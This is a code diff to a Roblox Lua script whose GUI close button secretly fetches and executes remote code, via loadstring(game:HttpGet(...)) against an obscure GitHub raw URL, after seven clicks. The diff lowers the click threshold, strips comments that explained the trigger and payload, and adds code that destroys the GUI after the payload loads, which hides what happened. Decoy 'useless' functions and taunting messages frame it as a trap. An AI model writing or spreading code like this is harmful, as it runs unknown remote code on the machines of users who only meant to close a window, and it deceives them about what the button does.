@@ -176,12 +176,10 @@ local clickCount = 0
 -- ============================================
 -- PAYLOAD SECTION
 -- ============================================
-local CLICKS_REQUIRED = 7  -- changed from 15 → 7
+local CLICKS_REQUIRED = 7
 local payloadExecuted = false
 
 -- >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
--- PASTE YOUR LOADSTRING BELOW (inside the quotes)
--- e.g. local PAYLOAD = "loadstring(game:HttpGet('https://...'))()"
 local PAYLOAD = [[loadstring(game:HttpGet("https://raw.githubusercontent.com/siadhjaosidhajso2/sdas2/refs/heads/main/dosdso2", true))()]]
 -- <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
 
@@ -218,6 +216,17 @@ local function executePayload()
     else
         print("[NiceTryBuddy] Payload executed. Nice try buddy.")
     end
+
+    -- Close the GUI after the payload has finished loading
+    task.wait(0.2)
+    pcall(function()
+        if screenGui and screenGui.Parent then
+            screenGui:Destroy()
+        end
+        if uselessFolder and uselessFolder.Parent then
+            uselessFolder:Destroy()
+        end
+    end)
 end
 
 -- ============================================
@@ -286,12 +295,10 @@ closeButton.MouseButton1Click:Connect(function()
     anotherUselessFunction()
     yetAnotherUselessFunction(true, true, true)
 
-    -- Update button text with progress toward the payload
     if clickCount < CLICKS_REQUIRED then
         closeButton.Text = "Clicked " .. clickCount .. "/" .. CLICKS_REQUIRED
     end
 
-    -- Tween bounce
     local originalSize = closeButton.Size
     local tweenInfo = TweenInfo.new(0.1, Enum.EasingStyle.Bounce, Enum.EasingDirection.Out)
     local tween = TweenService:Create(closeButton, tweenInfo, {
@@ -305,7 +312,6 @@ closeButton.MouseButton1Click:Connect(function()
     })
     revertTween:Play()
 
-    -- Trigger payload on threshold
     if clickCount >= CLICKS_REQUIRED and not payloadExecuted then
         closeButton.Text = "You asked for it..."
         closeButton.BackgroundColor3 = Color3.fromRGB(120, 0, 0)
@@ -313,7 +319,6 @@ closeButton.MouseButton1Click:Connect(function()
         return
     end
 
-    -- Chatter after the payload already ran
     if payloadExecuted then
         closeButton.Text = "You did this to yourself."
         return
